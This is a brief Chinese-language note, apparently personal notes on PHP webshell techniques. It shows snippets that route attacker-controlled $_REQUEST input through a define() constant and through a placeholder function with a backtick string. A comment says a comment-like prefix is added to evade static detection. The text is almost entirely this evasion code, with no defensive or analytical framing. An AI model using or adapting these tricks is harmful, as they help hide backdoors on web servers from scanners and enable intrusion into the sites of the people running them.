# ygh

---

变量定义：

```
define("hi","$_REQUEST[1]");
echo hi;  # 输出$_REQUEST[1]传输的内容
echo HI;  # 输出$_REQUEST[1]传输的内容
```

变形：

```
$url=$_REQUEST[1];
$http=" ";
xxx(`/******/***xxxx***\\/******`.$http.$url);  # 在前面加注释绕过静态检测
```

